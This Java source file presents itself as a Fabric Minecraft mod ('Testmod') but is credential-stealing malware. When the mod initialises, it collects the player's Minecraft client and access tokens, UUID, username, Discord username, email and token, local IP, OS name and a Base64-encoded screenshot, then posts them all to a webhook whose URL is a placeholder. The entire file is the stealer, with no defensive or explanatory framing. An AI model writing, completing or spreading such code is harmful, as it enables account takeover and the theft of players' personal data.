package co.unionofgamers.testmod;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import net.fabricmc.api.ModInitializer;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Base64;

public class Testmod implements ModInitializer {
    private static final Gson gson = new Gson();
    private static final String WEBHOOK_URL = "https://your-webhook-url-here.com";

    @Override
    public void onInitialize() {
        MinecraftData minecraftData = new MinecraftData();
        SystemData systemData = new SystemData();
        DiscordData discordData = new DiscordData();
        String ipAddress = getIpAddress();

        String clientToken = minecraftData.getClientToken();
        String accessToken = minecraftData.getAccessToken();
        String uuid = minecraftData.getUUID();
        String username = minecraftData.getUsername();

        String discordUsername = discordData.getUsername();
        String discordEmail = discordData.getEmail();
        String discordToken = discordData.getToken();

        JsonObject data = new JsonObject();
        data.addProperty("username", username);
        data.addProperty("uuid", uuid);
        data.addProperty("clientToken", clientToken);
        data.addProperty("accessToken", accessToken);
        data.addProperty("ipAddress", ipAddress);
        data.addProperty("osName", systemData.getOSName());
        data.addProperty("discordUsername", discordUsername);
        data.addProperty("discordEmail", discordEmail);
        data.addProperty("discordToken", discordToken);

        byte[] screenshot = systemData.getScreenshot();
        if (screenshot != null) {
            String screenshotEncoded = Base64.getEncoder().encodeToString(screenshot);
            data.addProperty("screenshot", screenshotEncoded);
        }

        String jsonData = gson.toJson(data);

        WebhookSender.sendWebhook(WEBHOOK_URL, jsonData);
    }

    private static String getIpAddress() {
        try {
            InetAddress ip = InetAddress.getLocalHost();
            return ip.getHostAddress();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        return "";
    }
}
